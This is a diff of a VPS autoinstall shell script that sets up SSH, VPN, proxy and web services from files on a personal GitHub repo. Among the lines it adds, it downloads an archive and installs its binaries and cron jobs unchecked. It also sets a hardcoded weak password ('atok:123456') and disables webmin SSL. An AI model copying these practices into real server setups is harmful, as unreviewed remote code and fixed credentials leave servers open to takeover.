@@ -130,17 +130,20 @@ service exim4 stop;sysv-rc-conf exim4 off;
 # webmin
 apt-get -y install webmin
 sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+
 # dropbear
 apt-get -y install dropbear
 wget -O /etc/default/dropbear "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/dropbear"
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
+
 # squid3
 apt-get -y install squid3
 wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/squid.conf"
 wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/squid.conf"
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
+
 # openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
@@ -149,6 +152,7 @@ wget -O /etc/iptables.up.rules "$source/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 iptables-restore < /etc/iptables.up.rules
+
 # nginx
 apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
@@ -164,13 +168,15 @@ sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/p
 apt-get -y install fail2ban;service fail2ban restart
 
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/cucuatok93/cucuatok/master/client.ovpn"
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-useradd -m -g users -s /bin/bash ARCHANGELS
-echo "7C22C4ED" | chpasswd
-echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+wget -O /home/vps/public_html/client.ovpn "$source/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
+wget $source/cronjob.tar
+tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash sshvpn
+echo "atok:123456" | chpasswd
+
 # Badvpn
 apt-get -y install cmake make gcc
 wget https://raw.githubusercontent.com/cucuatok93/cucuatok/master/badvpn-1.999.127.tar.bz2
